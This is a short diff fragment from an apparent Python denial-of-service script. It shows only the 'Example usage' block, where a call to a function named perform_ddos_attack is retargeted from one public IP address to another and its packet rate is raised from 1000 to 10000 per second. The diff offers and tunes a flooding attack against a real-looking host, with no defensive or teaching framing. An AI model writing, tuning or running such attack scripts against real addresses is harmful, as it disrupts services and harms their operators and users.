@@ -27,7 +27,7 @@ except KeyboardInterrupt:
 
 Example usage:
 
-target_ip = "62.219.78.222"  # Replace with the target IP address
-packets_per_second = 1000  # Adjust the packets per second rate as needed
+target_ip = "52.84.150.34"  # Replace with the target IP address
+packets_per_second = 10000  # Adjust the packets per second rate as needed
 
 perform_ddos_attack(target_ip, packets_per_second)
